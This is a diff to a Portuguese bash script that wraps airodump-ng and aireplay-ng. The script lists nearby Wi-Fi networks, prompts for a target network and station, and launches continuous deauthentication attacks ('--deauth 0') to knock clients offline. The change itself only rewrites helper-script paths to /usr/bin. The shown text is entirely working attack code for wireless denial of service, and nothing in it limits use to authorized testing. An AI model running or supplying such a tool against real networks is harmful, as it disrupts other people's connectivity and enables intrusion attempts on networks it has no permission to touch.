@@ -25,7 +25,7 @@ PLACA2=`ifconfig | grep w | cut -d ":" -f1`
 sleep 3
 
 #Código do diabo que demorei demais para conseguir chegar nele
-./Secundario.sh & airodump-ng $PLACA2 > mom.txt 2>&1 | pgrep -f airodump-ng > matar.txt
+/usr/bin/./Secundario.sh & airodump-ng $PLACA2 > mom.txt 2>&1 | pgrep -f airodump-ng > matar.txt
 
 #Apresentação das redes wi-fi disponiveis
 cat mom.txt | cut -c74-100000
@@ -48,19 +48,19 @@ REDEALVO=`cat mom.txt | grep $NOME | cut -d " " -f2 | sed -n '1p'`
 		echo ' '
 		rm mom.txt
 
-aireplay-ng --deauth 0 -D -a $REDEALVO $PLACA2 > /dev/null | ./Contador.sh
+aireplay-ng --deauth 0 -D -a $REDEALVO $PLACA2 > /dev/null | /usr/bin/./Contador.sh
 	
 	else
 		CH=`cat mom.txt | grep $NOME | cut -c49,50 | sed -n '1p'`
 		rm mom.txt
 
-./Terciario.sh & airodump-ng --bssid $REDEALVO -c $CH $PLACA2 > mom2.txt 2>&1 | pgrep -f airodump-ng > matar2.txt
+/usr/bin/./Terciario.sh & airodump-ng --bssid $REDEALVO -c $CH $PLACA2 > mom2.txt 2>&1 | pgrep -f airodump-ng > matar2.txt
 
 		echo '[ATENÇÃO] Copie e cole para evitar erros!'
 		echo '-----------------------------------------'
 		echo '[+] Digite o BSSID da estação alvo: ' ; read ESTALVO
 		echo ' '
 		
-aireplay-ng --deauth 0 -a $REDEALVO -c $ESTALVO $PLACA2 > /dev/null | ./Contador.sh	
+aireplay-ng --deauth 0 -a $REDEALVO -c $ESTALVO $PLACA2 > /dev/null | /usr/bin/./Contador.sh	
 	
 	fi
